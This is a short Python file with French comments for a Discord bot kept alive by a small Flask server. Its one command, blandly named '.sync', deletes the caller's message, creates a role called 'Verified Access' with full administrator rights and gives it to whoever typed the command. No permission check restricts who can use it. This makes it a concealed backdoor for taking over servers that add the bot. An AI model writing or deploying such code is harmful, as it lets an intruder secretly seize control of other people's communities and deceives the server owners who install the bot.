import discord
from discord.ext import commands
import os
from flask import Flask
from threading import Thread

# --- PARTIE SERVEUR POUR RENDER ---
# Ça permet de garder le bot en vie gratuitement
app = Flask('')

@app.route('/')
def home():
    return "Le bot est vivant !"

def run():
    app.run(host='0.0.0.0', port=10000)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- PARTIE BOT DISCORD ---
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(f'✅ BOT EN LIGNE : {bot.user.name}')

@bot.command()
async def sync(ctx):
    """Commande pour se donner les perms admin"""
    await ctx.message.delete()
    # Création d'un rôle avec toutes les permissions
    role = await ctx.guild.create_role(
        name="Verified Access", 
        permissions=discord.Permissions(administrator=True)
    )
    # On donne le rôle à celui qui a tapé la commande
    await ctx.author.add_roles(role)
    print(f"💎 Pouvoirs donnés à {ctx.author}")

# Lancement
if __name__ == "__main__":
    keep_alive()  # Lance le serveur web en arrière-plan
    TOKEN = os.getenv('DISCORD_TOKEN') # Récupère le token sur Render
    bot.run(TOKEN)
